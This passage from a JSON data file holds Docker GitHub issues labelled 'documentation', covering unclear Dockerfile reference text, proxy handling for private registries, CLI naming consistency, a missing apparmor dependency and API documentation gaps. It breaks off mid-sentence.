lot.\n\nhttps://docs.docker.com/installation/rhel/\n"},{"labels":["documentation",null,null],"text":"In some or many organisations the HTTP_PROXY is appropriate only for external registry access and may not function correctly for an internal private registry. The purely global nature of the proxy from the environment makes running a private registry problematic.\nThe code in registry.go for defining registry access could be made conditional through a new unproxied_registry flag - so instead of an unconditional\nhttpTransport := &http.Transport{\n        DisableKeepAlives: true,\n        Proxy:             http.ProxyFromEnvironment,\n        TLSClientConfig:   &tlsConfig,\n    }\nthe Proxy: could be conditional. This might be conditional based on an address map or other specification of registry addresses that should not be proxied even when the proxy is set in the environment.\n\nIt could be argued that this is working around broken internal proxies. This is a fair argument but it is not necessarily straightforward to modify proxy configuration in large organisations. It is also a network optimisation to use a private registry rather than use a proxy in many cases.\n"},{"labels":["documentation",null,null,null],"text":"Kernel keyrings are not namespaced and thus not secure on hosts running Docker. This should be made clear and explicit in the security article.\n\nMachines running full disk encryption and Docker may be vulnerable to attacks to the system keyring.\n"},{"labels":["documentation",null,null],"text":"Reading Docker documentation as a first time user. The general structure and tutorial are great, but texts have some problems. For example\n\nhttps://docs.docker.com/reference/builder/\n\nIt's not clear at some places, contains details but not general information, referring to ambiguous terms. e.g. for CMD, ENTRYPOINT, ENV, ADD, .... \n- each topic does not start with clear description of the command purpose and what problem it tries to solve\n- the context is not clearly defined (e.g. CMD vs RUN): is it for process of building an image or for running inside of a container based on the image being built.\n- the reference like \"this is to set defaults\" is completely confusing. For defaults in which context and what kind of commands?\n- ADD copies files from source to destination. Where are source and destination, copying on which phase?\n- environment - there must be a clear explanation about one environment that exists in a Dockerfile scope, another for commands that are RUN to build image, third - for everything that will be run inside a container built on the image.\n- word \"container\" here often is confusing. Container at the build time or after running a container based on built image?\n"},{"labels":["documentation"],"text":"https://docs.docker.com/userguide/dockerlinks/  and related should provide guidance on how or why a user would choose one method of creating container versus another (security, management, data).  Also, do we have general guidelines as to which we recommend as the \"default\" technique.\n\nCorollary, it would be good if containers in the Hub follow the default technique to avoid confusing messages.\n"},{"labels":["documentation",null],"text":"The new /stats endpoint seems like a great idea. Unfortunately the way it is currently defined, there is no description of what the fields are or what values they can have. This seems like it will cause problems moving forward especially for porting docker to other platforms.\n\nAs far as I can tell, the new fields are defined based on their implementation which appears to be the cgroups statistics. This makes some sense on Linux with a specific version of the cgroups stats but if those stats ever changed or if you were porting docker to another platform this immediately becomes problematic.\n\nIn the same way that the /top data is currently different on other hosts and platforms (as described in #9232) this endpoint as it is, seems like it's going to cause a lot of problems for portability.\n\nIs it possible for the next version of the API to at least define the fields? Ideally they'd have been defined as something implementation independent to start with but if that ship has sailed, at least defining the fields using the current cgroups names and listing what the possible keys and values are would be a huge step forward for portability.\n"},{"labels":["documentation"],"text":"Shouldn't there be a way for me to easily empty docker's cache in order to save disk space?\n\nSomething like `docker clear-cache`\n"},{"labels":["documentation",null],"text":"There are errors in the manpages because parameters in angle brackets aren't included in `md2man` output. For [example](https://github.com/docker/docker/blame/master/docs/man/Dockerfile.5.md#L137), \n\n```\n**ADD [\"<src>\"... \"<dest>\"]** This form is required for paths containing whitespace.\n```\n\nrenders as\n\n```\nADD [\"\"... \"\"] This form is required for paths containing whitespace.\n```\n\nNote the missing `<src>` and `<dest>`.\nThis can also be seen in GitHub's rendering of the text:\n\n**ADD [\"<src>\"... \"<dest>\"]** This form is required for paths containing whitespace.\n\n---\n\n**PROBLEM**: man docs are often imporoperly formatted, using quotes or bolds when code blocks/segments are required\n\n**PROPOSED SOLUTION**: man docs should be updated to use appropriate backticks for either inline or blocked code.\nThe `dockerfile.5.md` has already been gone through, but wouldn't hurt another set of eyes.\n"},{"labels":["documentation",null,null],"text":"At first glance I thought \"die\" means the container stopped unexpectedly. \nBut when I stop a container manually I see the \"die\" event followed by a \"stop\" event. I think the \"die\" event here is unnecessary.\nI want to implement a web interface and need to show the user all the history events of the container, but with the current docker events API it seems that it's hard to distinguish \"normally stop\" from \"unexpectedly stop\".\n"},{"labels":["documentation"],"text":"In container:\n\n```\nyum install -y epel-release\nyum install -y http://iredmail.org/yum/rpms/7/cluebringer-2.0.14-4.el7.centos.noarch.rpm\n```\n\nAfter install, some files are missing: \n/usr/share/doc/cluebringer-2.0.14/\nonly have contrib directory, but it should be \nAUTHORS  ChangeLog  contrib  database  INSTALL  LICENSE  TODO  WISHLIST\n\nThis works under host.\n"},{"labels":["documentation",null],"text":"The section on docker login does not explain where the \"login state\" is kept, or what can happen to lose the credentials.  For example, if the credentials are stored in a file, which file is updated?  Does resolving credentials depend on the UID of the current process, the $HOME variable (to find a dot-file), etc.\n\nhttps://docs.docker.com/reference/commandline/cli/#login\n"},{"labels":["documentation",null,null],"text":"I just run over a rather undokumented behaviour from a docker ecosystem viewpoint.\nI needed to figure out, how ENV are processed (if in single or double quoted notion by default, which implies caution about escaping.)\n\nSo I would love to see a hint on the docs to clarify the point.\nhttp://docs.docker.com/reference/builder/#env\n\n**_Suggestion:**_\n\"ENV are processed in the double quoted notion by default which makes strings subject to shell escaping acording to the shell used in the target image. You can use the alternative declaration with single quotes instead.\"\n"},{"labels":["documentation",null],"text":"The \"Finding the Cgroup for a Given Container\" section of https://docs.docker.com/articles/runmetrics/ is out of date, at least for containers that do not use LXC.\n\nHere is an example: \"Putting everything together to look at the memory metrics for a Docker container, take a look at /sys/fs/cgroup/memory/lxc/<longid>/.\"  I don't use LXC.  On my Ubuntu 14.04 machine running Docker 1.4.1, the correct path is /sys/fs/cgroup/memory/docker/<longid>/.\n"},{"labels":["documentation",null,null],"text":"If you want to remove a link between containers, you can use `docker rm --link`. The current documentation says:\n\n```\n $ docker help rm\n\nUsage: docker rm [OPTIONS] CONTAINER [CONTAINER...]\n\nRemove one or more containers\n\n  -f, --force=false      Force the removal of a running container (uses SIGKILL)\n  -l, --link=false       Remove the specified link and not the underlying container\n  -v, --volumes=false    Remove the volumes associated with the container\n```\n\nI eventually figured out that you need to use the syntax `docker rm -l HOSTCON/LINKCON`, but I'm not sure how I was meant to know that. It doesn't feel symmetrical to the syntax used to create a link or other commands which typically use : as a separator.\n\nAlso, I'm really not convinced `docker rm` is the right place for the functionality - all other flags remove the container including `-v`. Could this be moved to a `docker unlink` subcommand or similar and the documentation improved?\n"},{"labels":["documentation",null],"text":"There is no mention of what the permitted parameters are for starting a container are in the remote documentation API. I _know_ that some options are permitted, for example I've been using `\"PublishAllPorts\"` . I'm not sure if its mostly the same as /containers/create or not.\n\nhttps://docs.docker.com/reference/api/docker_remote_api_v1.16/#start-a-container\n"},{"labels":["documentation",null,null,null],"text":"I ran an experiment today to see how these things intersect.\n\nhttps://gist.github.com/thockin/c44a88b84c2a1041a1bd\n\nThere are three cells in this matrix that are totally nonsensical.  Worse the dockerfile spec says \"The shell form prevents any CMD or run command line arguments from being used\", which is clearly untrue.\n\nMore that this, though, the semantic between the two is sort of weird, especially since they can be arrays or strings.\n\nI wonder if there has been any thought put into simplifying the semantics around these things?\n"},{"labels":["documentation",null],"text":"Hi\n\nHere's a transcript from a chat I had (with one of your employees?) a few minutes ago, that describes everything:\n\nyaronr: Strange. After bind-mounting a file, it changes to be a directory. removing the -v - and the file is a file again..\nyaronr: has anyone seen this?\nerikh: it's a known issue\nyaronr: erikh: really ?! I've spent hours on it\nyaronr:it used to work.\nerikh: when?\nyaronr: up until a couple of weeks ago. I have this unit file that uses this approach to map a config file from the host to the container\nyaronr: erikh: I actually have a few of them..\nerikh: what version of docker were you using before?\nyaronr: 1.3.x\nerikh: and it doesn't work in 1.4 now?\nerikh: put in an issue\nyaronr: yup\nerikh: I swear it never worked this way though\nyaronr: I'm pretty sure there even was an example for mounting specific files, in the docs.\nyaronr: erikh: you said it's a known issue - what do you mean?\nerikh: well, then definitely put in an issue :)\nerikh: I swear that we didn't support this\nerikh: but I could be wrong\nerikh: other people know that code better than me, like cpuguy83\nerikh: but I think he's at lunch\nyaronr: erikh: AHA, it IS (or should be) supported, read the docs: https://docs.docker.com/userguide/dockervolumes/  'Mount a Host File as a Data Volume'\nyaronr\nerikh: don't swear so quickly ;)\nyaronr: so I guess what you're saying is that you think something has changed in this area?\nyaronr: this explains why one day, a bunch of my unit files stopped responding..\nyaronr: ping?\n"},{"labels":["documentation",null],"text":"##### Steps To Reproduce\n- Create an image using the following Dockerfile source:\n\n```\n    FROM       ubuntu:12.04\n    RUN apt-get update;  \\\n        apt-get install -y screen;\n    RUN adduser --disabled-password --gecos -- dlw; \\\n        passwd -d dlw;\n    USER dlw\n    ENTRYPOINT  /bin/bash\n```\n- Execute image: `'docker run -i -t <imageGUID>.'`\n- On resulting container's command line attempt to start:  `screen`.\n  Screen will issue the following message:\n  `Cannot open your terminal '/dev/console' - please check.`\n  Here are the permissions as displayed by `'ls -al /dev/console'`:\n\n```\n    crw------- 1 root root 136, 7 Dec 24 12:15 /dev/console\n```\n- Alter Dockerfile so 'root' becomes default user and explicitly log in 'dlw' (non-root) account:\n\n```\nFROM       ubuntu:12.04\nRUN apt-get update;  \\\n    apt-get install -y screen;\nRUN adduser --disabled-password --gecos -- dlw; \\\n    passwd -d dlw;\nUSER root\nENTRYPOINT  login dlw\n```\n- Execute image: `'docker run -i -t <imageGUID>.'`\n- Start: `screen`.\n  Screen works as expected.\n  Here are the permissions as displayed by `'ls -al /dev/console'`:\n\n```\n    crw------- 1 dlw tty 136, 7 Dec 24 12:33 /dev/console\n```\n##### Environment\n- Using docker version 1.3.1.\n- Ubuntu  12.04.4 LTS\n##### Behavior Assessment\n\nAn implicit login request, implemented by Dockerfile USER statement, that isn't 'root' doesn't seem to completely prepare a container's permissions to the /dev/console device for the implicit user.  However, an explicit 'login' request (event) triggers the container permissions for '/dev/console' to allow  non-root container accounts access to this device.  Are there potentially other permission issues resulting from this difference between implicit/explicit login requests?\n"},{"labels":["documentation",null,null],"text":"When you are browsing the documentation at https://docs.docker.com/ , the links for the release notes for previous versions is inconsistent or broken.   I was trying to find the Docker 1.2 release notes and had to go on a bit of a hunt to finally get to it.\n\nStarting at the main page\n https://docs.docker.com/  \nThe LHS link to release notes takes you to the bottom of the page, to the release notes section\nhttps://docs.docker.com/#release-notes\n\nThe link there takes you to\nhttps://docs.docker.com/release-notes/\nWhich has the Docker 1.4 documentation version of Release Notes.  This is missing the previous 1.3, 1.2 and other release notes.  This made me think that the drop down in the top right was how you got other release note versions.\n\nGoing to Version v1.3 will take you to\nhttps://docs.docker.com/v1.3/release-notes/\nWhich has the release notes as of v1.3  which also contains the previous versions of 1.2, 1.1 and 1.0 release notes on the LHS.  Those links take you to the various sections of that v1.3 release notes page.\n\nGoing to Version 1.2 from the drop down, you get taken to\nhttps://docs.docker.com/v1.2/release-notes/\nWhich does not exist.  Same for other versions.\n\nBut there does exist a v1.2 release notes page, it is just not a separate page and is a section on the main v1.2 page.\nhttps://docs.docker.com/v1.2/#release-notes\n\nAdditionally if you are on the main page for docs\nhttps://docs.docker.com/\n\nGo to v1.3 from the drop down menu, now at\nhttps://docs.docker.com/v1.3/\n\nThe release notes link on the LHS takes you to bottom of page\nhttps://docs.docker.com/v1.3/#release-notes\n\nThe link in that section takes you to\nhttps://docs.docker.com/release-notes/\n\nWhich is the release notes for v1.4 not v1.3 \nDrop down menu top right will change to v1.4\nChanging it to v1.3 will now take you to \nhttps://docs.docker.com/v1.3/release-notes/\n\nHope that describes the different click workflows I had to go through\n\nI think the following should happen:\nRelease notes for 1.4 should be updated with previous versions (similar to 1.3) if it is suppose to be a comprehensive living release notes document\nIf not, then each previous version should get a separate release notes page in their respective areas so the drop down selector when on the release notes page works for them.\n"},{"labels":["documentation",null,null,null],"text":"Description of problem:\n\nAfter installing the lxc-docker package from the repositories\nprovided by Docker on Ubuntu 14.04.1 the Docker daemon fails to\nstart because of the missing executable `/sbin/apparmor_parser`.\n\n`docker version`:\n\n```\nClient version: 1.4.1\nClient API version: 1.16\nGo version (client): go1.3.3\nGit commit (client): 5bc2ff8\nOS/Arch (client): linux/amd64\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\n`docker info`:\n\n```\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\n`uname -a`:\n\n```\nLinux srv28 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\n\nA new physical server with a fresh minimal install of Ubuntu 14.04.1.\n\nHow reproducible:\n\nOn a custom minimal Ubuntu install without apparmor this is always reproducable. The standard Ubuntu install seems to include apparmor and therefore the problem is not apparent. \n\nSteps to Reproduce:\n1. Follow install instructions: http://docs.docker.com/installation/ubuntulinux/#docker-maintained-package-installation\n2. `service docker start`\n2. `docker info`\n\nActual Results:\n\nThe Docker daemon fails to start.  `docker info` outputs\n\n```\nFATA[0000] Cannot connect to the Docker daemon. Is 'docker -d' running on this host? \n```\n\nand `/var/log/upstart/docker.log` contains\n\n```\nINFO[0000] +job serveapi(unix:///var/run/docker.sock)   \nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock) \nINFO[0000] +job init_networkdriver()                    \nINFO[0000] -job init_networkdriver() = OK (0)           \nINFO[0000] WARNING: Your kernel does not support cgroup swap limit. \nFATA[0000] Error loading docker apparmor profile: fork/exec /sbin/apparmor_parser: no such file or directory () \n```\n\nExpected Results:\n\nThe Docker daemon should be up and running.  `docker info`\nshould output something like\n\n```\nContainers: 0\nImages: 0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 0\nExecution Driver: native-0.2\nKernel Version: 3.13.0-43-generic\nOperating System: Ubuntu 14.04.1 LTS\nCPUs: 12\nTotal Memory: 62.89 GiB\nName: srv28\nID: SDXF:XYT2:PAMA:OSYS:2QJD:VIZN:MDUU:PYJK:YJXY:2RCA:4A6F:ZCDL\nWARNING: No swap limit support\n```\n\nand `/var/log/upstart/docker.log` should contains something like\n\n```\nINFO[0000] +job serveapi(unix:///var/run/docker.sock)   \nINFO[0000] Listening for HTTP on unix (/var/run/docker.sock) \nINFO[0000] +job init_networkdriver()                    \nINFO[0000] -job init_networkdriver() = OK (0)           \nINFO[0000] WARNING: Your kernel does not support cgroup swap limit. \nINFO[0000] Loading containers: start.                   \nINFO[0000] Loading containers: done.                    \nINFO[0000] docker daemon: 1.4.1 5bc2ff8; execdriver: native-0.2; graphdriver: aufs \n```\n\nAdditional info:\n\nRunning the following command allows the Docker daemon to start\nproperly:\n\n```\napt-get install apparmor\n```\n\nThus the lxc-docker package should depend on apparmor which contains the missing executable `/sbin/apparmor_parser`.\n"},{"labels":["documentation",null,null],"text":"This is a request for comments to either build our own tooling, or use existing tools to do the following:\n- Keep bash completions in sync with the client (when flags are added, etc)\n- Keep API docs up to date when the API is updated/ new things are added\n- Keep man pages in sync with changes to the client\n\nIf anyone has existing tools they think would be good for this, please comment. The problems that we have seen with suggested tools in the past are that they are not easily integrated to our setup and we cannot benefit from all the features they provide. Also we wind up only solving part of the problem. So it ends up feeling like a big, heavy bandaid and is not ideal.\n"},{"labels":["documentation",null,null],"text":"I might take a crack at this if there's interest, but I'd like to at least note down that I'm keen on having a page in documentation dedicated to discussing the upgrade path for users running versions of Docker that lag behind the latest.  In particular it would be useful to formalize what to do in the case of when the user has installed with `curl get.docker.com | sh` and they want to upgrade.  Especially when urgent security fixes come out, it'd be nice to have a canonical way to do this (and possibly a script or something that does much of the work for you).\n\nRight now what I do for hobby use is:\n1. download the latest binary i.e. https://docs.docker.com/installation/binaries/#get-the-docker-binary\n2. replace the existing binary \n3. `sudo service docker restart`\n4. `docker run` the containers that were previously running again.  I can't remember if the processes that were run when the daemon restart happens get ghosted (which might cause odd issues), but they didn't show up in `docker ps` after a daemon reset with a new version last time that I checked.  I'm not sure if this is expected behavior or not.\n\nMy way of doing things might be completely broken but without an official word from us I'm not entirely sure if it is or isn't.\n\nAlso, if you're running a version from a package manager (say, 1.2) that is vulnerable and the official package archives lag behind the latest docker release, what do you do?\n"},{"labels":["documentation",null],"text":"Related: https://github.com/docker/docker/issues/9393, https://github.com/docker/docker/issues/5545\n\nThe way that default values for boolean flags/options is documented is confusing for some people and choosing a simpler notation could take away that confusion.\n\nFor example;\n\n```\n-v, --version=false               Print version information and quit\n```\n\nCould be interpreted as;\n\n\"To print version information, run `docker --version=false`\", whereas it _should_ be used;\n`docker --version`.\n\n_Technically_, it could be used as `docker --version=true`, but I doubt many people will find\nthat useful, so _not_ documenting this seems reasonable to me.\n### Proposed change\n\nChange the documentation (and help) for flags/options that _don't_ require/expect a value, and \nremove the default value. Flags that _do_ accept a value should still mention this.\n\nThe documentation will look like this;\n\n```\n-v, --version               Print version information and quit\n```\n### Other software\n\nI did a quick check how other software handles this. Some examples are below;\n\n```\n# MySQL:\n -V, --version       Output version information and exit.\n --select-limit=#    Automatic limit for SELECT when using --safe-updates.\n\n --server-arg=name   Send embedded server this as a parameter.\n\n# GIT\nusage: git [--version] [--help] [-C <path>] [-c name=value]    \n\n# Fig\nOptions:\n  --version                 Print version and exit\n  -f, --file FILE           Specify an alternate fig file (default: fig.yml)\n  -p, --project-name NAME   Specify an alternate project name (default: directory name)\n\n# SubVersion (svn checkout)\nValid options:\n  -r [--revision] ARG      : ARG (some commands also take ARG1:ARG2 range)\n                             [edited]\n  -q [--quiet]             : print nothing, or only summary information\n```\n\n**NOTE**\nThis proposal does _not_ intent to change the way flags are working right now, \nonly change the way it is _documented_. Changing the behavior of flags and renaming\nwas proposed in the past (https://github.com/docker/docker/pull/5760, https://github.com/docker/docker/pull/5764) and voted against / rejected, so please do not bring that up here again.\n"},{"labels":["documentation",null],"text":"This should be similar to https://github.com/docker/docker/issues/1024\nI am using:\nOSX yosemite\ndocker 1.3.1\nboot2docker 1.3.2\nI use as a **centos** base from sequenceiq: https://github.com/sequenceiq/hadoop-docker \nI try to install R and RStudio.  R does not give any problem, but this is what I get from RStudio:\n### \n\nInstall       1 Package(s)\nTotal size: 276 M\nInstalled size: 276 M\nDownloading Packages:\nRunning rpm_check_debug\nRunning Transaction Test\nTransaction Test Succeeded\nRunning Transaction\n  Installing : rstudio-server-0.98.1091-1.x86_64                            1/1 \ngroupadd: group 'rstudio-server' already exists\nrsession: no process killed\n**initctl: Unable to connect to Upstart: Failed to connect to socket /com/ubuntu/upstart: Connection refused**\ninitctl: Unable to connect to Upstart: Failed to connect to socket /com/ubuntu/upstart: Connection refused\n  Verifying  : rstudio-server-0.98.1091-1.x86_64                            1/1 \nInstalled:\n  rstudio-server.x86_64 0:0.98.1091-1  \nComplete!\n### \n\nAt the end of all the components load, I get:\n\nStep 31 : RUN echo rstudio | passwd --stdin rstudio\n ---> Running in 6bd3038eec99\n/usr/share/cracklib/pw_dict.pwd: No such file or directory\nPWOpen: Invalid argument\n## \n\nPlease note that the error message referring to ubuntu does not help to understand what is the issue.\n\nThanks in advance for any help.\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/master/docs/sources/articles/b2d_volume_resize.md\n"},{"labels":["documentation",null],"text":"http://docs.docker.com/userguide/dockerrepos/#find-public-images-on-docker-hub\n\nI tried the same steps except searching for node, and sure, I get the main top-level node result. The docs however seem to indicate this is image results I'm seeing, but they seem to be repositories. In fact, when I continue to the next step and run docker pull node, docker tries to download all images in the repo, clearly not what you expect from reading the documentation. \n\nAlso, there doesn't seem to be a clear way to list all images in the node repo from the command line. I only realised \"docker pull node:latest\" is what I was looking for from looking at the node repo website on the docker hub. \n"},{"labels":["documentation",null],"text":"Hi All,\n\nI am setting up the docker build environment. There is a step in docker makefile that:\n\ndocker build -t \"docker:master\" .\n\nand in the dockerfile, it need install golang as followed:\n# Install Go\n\nRUN    curl -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n\nUnfortunately, I can not directly visit golang from local so I setup a ssh tunnel and I can successfully vist the go source file through the pipe by command \" curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz\". And then, I change the dockerfile as:\n# Install Go\n\nRUN    curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n\nBut it failed by:\n\nStep 5 : RUN curl --socks5 127.0.0.1:9090 -sSL https://golang.org/dl/go1.3.3.src.tar.gz | tar -v -C /usr/local -xz\n ---> Running in 00ea81fe6596\ncurl: (7) Failed to connect to 127.0.0.1 port 9090: Connection refused\n\nIt seems that docker build running in different network stacks as my host. Is there any idea to help resolve it?\n"},{"labels":["documentation",null],"text":"I just found this today; \n Docker Remote API wrapper for Haskell - a Work in progress ; https://github.com/denibertovic/docker-hs \nThe doc page said to add a bug if new API's were discovered :).\nhttps://docs.docker.com/reference/api/remote_api_client_libraries/\n"},{"labels":[null,"documentation",null],"text":"**Summary**: \nThere is no standardised \"naming\" for (sub)commands on the CLI (e.g. plural vs singular, create vs add), sometimes leading to inconsistencies.  \n\n**Proposed solution**:\nA design document should be written, describing the (naming) conventions to follow for commands and the UX in general.\n\n---\n\nA number of new features are currently proposed via PRs for addition to Docker. These features add new commands to the CLI and I have noticed that the UI for those commands (and _existing_ commands) is inconsistent.\n\nWhile there still a chance to change those proposals before they are merged, I think it would be a good thing to review those PRs and reach consensus on what the UI should look like to be consistent.\n\nI've created a (far from complete) overview of some _existing_ and _proposed_ commands;\n\n| Entity | Action | Command | Notes |\n| --- | --- | --- | --- |\n| Container | list | `docker ps` |  |\n| Device | list | - | (not supported) |\n| Host | list | `docker hosts` | no sub command. see https://github.com/docker/docker/issues/8681 |\n| Image | list | `docker images` | no sub command (`ls`) |\n| Links | list | `docker links list` | see https://github.com/docker/docker/issues/7468 |\n| Volume | list | `docker volumes ls` | see https://github.com/docker/docker/pull/8484 |\n| Container | delete | `docker rm (id)` |  |\n| Device | delete | `docker device remove (id)` | see https://github.com/docker/docker/pull/8826 |\n| Host | delete | - | (not supported?) |\n| Image | delete | `docker rmi (id)` |  |\n| Links | delete | `docker links remove (id)` |  |\n| Volume | delete | `docker volumes rm (id)` |  |\n| Container | create | `docker create` | no \"containers\" before \"create\" |\n| Device | create | `docker device add` | note: _singular_ \"device\", others are \"plural\" |\n| Host | create | `docker hosts create` | `run` [is proposed as alternative](https://github.com/docker/docker/issues/8681#issuecomment-60349475) |\n| Link | create | `docker links add` |  |\n| Volume | create | `docker volumes add` |  |\n- The `ls` and `list` subcommands could be omitted dropped for `volumes` and `links` to be in line with the existing `images` command. \n- The subcommand for \"delete\" should either be \"remove\" or \"rm\" for all entities.\n- The subcommand for \"create\" could be renamed from \"add\" to \"create\" to be in line with the existing `docker create` command (not sure, I actually like \"add\")\n- All entities / top-level commands should be either plural or singular (rename `device` to `devices`?)\n\nNow that the \"links\" (https://github.com/docker/docker/issues/7468), \"volumes\" (https://github.com/docker/docker/pull/8484), \"hosts\" (https://github.com/docker/docker/issues/8681) and \"devices\" (https://github.com/docker/docker/pull/8826) changes are still a proposal, I think the creators those proposals should discuss a consistent UI before they're implemented to keep things consistent.\n\nFor the _existing_ commands I understand that most frequently used commands are deliberately left short for convenience, perhaps \"long\" versions (`docker images rm`?) could be added to make the UI more consistent.\n\n(This is a follow up on a comment I placed here https://github.com/docker/docker/pull/8484#issuecomment-60827328)\n\n**update**\nAdded the \"hosts\" proposal to the list and sorted the list a bit\n"},{"labels":[null,"documentation"],"text":"I think the ADD and COPY directives don't work as one would expect. Given this directory layout:\n\n```\n.:\ndir  Dockerfile  rootfile.txt\n\n./dir:\nchild  dirfile.txt\n\n./dir/child:\nchildfile.txt\n```\n\nand this Dockerfile:\n\n```\nFROM debian:wheezy\nCOPY rootfile.txt dir /test/\nCMD [\"ls\", \"-R\", \"/test\"]\n```\n\nI get this image result:\n\n```\n/test:\nchild  dirfile.txt  rootfile.txt\n\n/test/child:\nchildfile.txt\n```\n\nThe documentation states that `If <src> is a directory, the entire directory is copied, including filesystem metadata.`\nThis sound like the COPY and ADD directive should behave like a `cp -r <src> <dest>` (which I expected), but if `<src>` is a directory, not the directory itself is copied but the contents of the directory.\n\nIs this intended behavior?  When yes, then the documentation should clearly say that the contents of a <src> directory is copied and not the directory.\n\n```\ndocker version:\nClient version: 1.3.0\nClient API version: 1.15\nGo version (client): go1.3.3\nGit commit (client): c78088f\nOS/Arch (client): linux/amd64\nServer version: 1.3.0\nServer API version: 1.15\nGo version (server): go1.3.3\nGit commit (server): c78088f\n\ndocker info:\nContainers: 8\nImages: 69\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Dirs: 85\nExecution Driver: native-0.2\nKernel Version: 3.17.1-1-aufs_friendly\nOperating System: Arch Linux\nDebug mode (server): false\nDebug mode (client): true\nFds: 10\nGoroutines: 15\nEventsListeners: 0\nInit SHA1: e244de98e642144b162d1936978b8ac5d024d546\nInit Path: /usr/lib/docker/dockerinit\nWARNING: No swap limit support\n```\n"},{"labels":["documentation",null],"text":"Hi guys,\n\n**Basic problem:**\nthe doc section on Dockerfiles is rather confusing, because it doesn't really explain an important concept: why is the dockerfile named \"Dockerfile\" similar to \"Makefile\", and what does that mean for the folder is it in? Why is it not just a \"buildmyimage\" file and that's it? Why a whole folder around it, what is it for?\n\n**Current situation:**\nThe docs make a basic attempt at explaining it here: http://docker.readthedocs.org/en/v0.5.3/use/builder/ 1. Usage: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository.\"\n\nHowever, the docs completely drop the ball clarifying this. What is a repository here? Is that something special with special other files that are automatically used? Does it need a specific layout?\n\nEven worse, if you are sufficiently confused to click \"Working with repositories\" in the navigation to clear this up, that section introduces a confusing online image thing where the basic concept of what a single repository is _in practise on my hard disk as a basic folder_ is entirely missing.\n\n**Proposal:**\nhttp://docker.readthedocs.org/en/v0.5.3/use/builder/ 1. Usage: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository.\"\n\nChange to: \"To build an image from a source repository, create a description file called Dockerfile at the root of your repository, which is just the basic folder containing all sorts of other resources you might need and later reference from your Dockerfile to include and use for your image as needed.\"\n\nOr whatever you see fit. But please add a proper explanation!\n\n**Disclaimer:**\nI started reading the docker docs a few hours ago, so I might be misunderstanding basic concepts. But this really seemed confusing to me, so it would be neat if you could look into it - unless the explanation is already there and I was just too blind to stumble across it.\n"},{"labels":["documentation",null],"text":"Bugzilla https://bugzilla.redhat.com/show_bug.cgi?id=1121689 \n\nDescription of problem:\nThe handling of stdout/stderr stream is not correct in tty mode (works fine in non-tty mode). You can see it on the example bellow. (`ls non_existing_file` prints into stderr stream)\n\nVersion-Release number of selected component (if applicable):\ndocker-1.1.1-1.el7.x86_64\n\nHow reproducible:\nAlways\n\nSteps to Reproduce:\nTTY:\n[root@localhost ~]# docker run -t -a stderr fedora ls non_existing_file\n[root@localhost ~]# docker run -t -a stdout fedora ls non_existing_file\nls: cannot access non_existing_file: No such file or directory\nNON-TTY:\n[root@localhost ~]# docker run -a stderr fedora ls non_existing_file\nls: cannot access non_existing_file: No such file or directory\n[root@localhost ~]# docker run -a stdout fedora ls non_existing_file\n\nActual results:\nIn tty mode the output is visible only when STDOUT is attached, in non-tty mode it's visible in STDERR\n\nExpected results:\nIn booth modes the output should be in STDERR stream.\n\nAdditional info:\nWhen I use `ls /` it prints the info correctly into STDOUT in booth modes.\n"},{"labels":[null,"documentation",null,null],"text":"Registry 0.8.0 and the Hub and Registry Spec v1.2 do not match up for pushing images. I haven't tested pulling images yet.\n\nCan you clarify which version of the spec goes with which version of the registry?\n\nAs far as I can tell steps are wrong.\n\nFor pushing an image I'm seeing this request GET /v1/repositories/dockerfile/nginx/layer/27cf784147099545/access, yet there is no documentation talking about an access endpoint, and the built in no-auth index apart of the registry code doesn't event reference an access endpoint.\n\nThe behavior I see is the following. This is version 0.8.0 of the registry and 1.2.0 of the docker client/daemon\n\n(this flow here does not include the registry actions, just the actions I am seeing on the index/hub)\n1. GET /v1/_ping\n2. PUT /v1/repositories/:namespace/:repo\n3. GET /v1/repositories/:namespace/:repo/images\n4. GET /v1/repositories/:namespace/:repo/images\n5. GET /v1/repositories/:namespace/:repo/layer/:image/access\n\nAt step 5 it fails with `2014/09/08 12:11:34 HTTP code 400 while uploading metadata: {\"error\": \"Image depends on an unauthorized parent\"}`\n\nThanks.\n"},{"labels":["documentation",null],"text":"Based on https://docs.docker.com/articles/runmetrics/#interface-level-counters but scripted/refined and working on Ubuntu 14.04. The main thing needed in the documentation a comment for 14.04 showing the path to the cgroup device is /sys/fs/cgroup/devices/docker/$CID_/tasks instead of /sys/fs/cgroup/devices/$CID_/tasks, but here's a script to show the interface stats in one command.\n\n```\n#!/bin/bash\nif [ $# -ne 1 ]; then\n  echo \"usage: $0 {container_id}\"\n  exit 1\nfi\n\nSHORT_CID=$1\nCID=$(docker inspect --format=\"{{.Id}}\" ${SHORT_CID} 2>/dev/null)\nif [ $? -ne 0 ]; then\n  echo \"No container: ${SHORT_CID}\"\n  echo \"Are you running with sudo?\"\n  exit 2\nfi\n\n\nTASKS=/sys/fs/cgroup/devices/docker/$CID/tasks\nPID=$(head -n 1 ${TASKS})\nNETNS_PATH=/var/run/netns/${CID}\n\nmkdir -p /var/run/netns\nln -sf /proc/$PID/ns/net ${NETNS_PATH}\nip netns exec ${CID} netstat -i\n\nunlink ${NETNS_PATH}\n```\n"},{"labels":["documentation",null],"text":"Many fields in the response objects that I actually get in my local calls do not exist in Remote API v1.13 documentation.\n\nAnd documentation is so bad that there are no types specified.\n\ne.g. it just says:\n\n```\n \"PortSpecs\":null,\n```\n\nwhat is the type of this field? It is just a null in JSON response.\n\nThat doesn't make sense. Docs are very vague and it's almost impossible to write a correctly working client without reading other clients and keep testing every single corner case (e.g. you gotta reproduce a case where portspecs is not null by creating a container etc).\n\nThis is crazy and will not help things move forward very 